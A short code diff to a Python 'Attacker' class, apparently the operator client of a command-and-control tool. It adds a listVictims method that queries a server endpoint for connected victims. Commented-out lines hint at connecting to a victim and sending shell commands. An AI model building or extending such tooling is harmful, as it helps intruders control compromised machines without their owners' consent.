@@ -42,8 +42,9 @@ class Attacker:
 
         return response
 
+    # Return a list of connected victims
     def listVictims(self):
-        pass
+        return self.__session.request('GET', self.__serverUrl + '/attacker/listVictims.php')
 
     def connectToVictim(self, victim):
         pass
@@ -76,7 +77,9 @@ def main():
     attacker = Attacker()
     print('Requesting login...')
     printResponse(attacker.connectToServer(baseUrl))
-    #victimsList = attacker.listVictims()
+    print('Listing victims...')
+    victimsList = attacker.listVictims()
+    printResponse(victimsList)
     #attacker.connectToVictim(victimsList[0])
     #output = attacker.sendCommand('ls')
     #print(output)
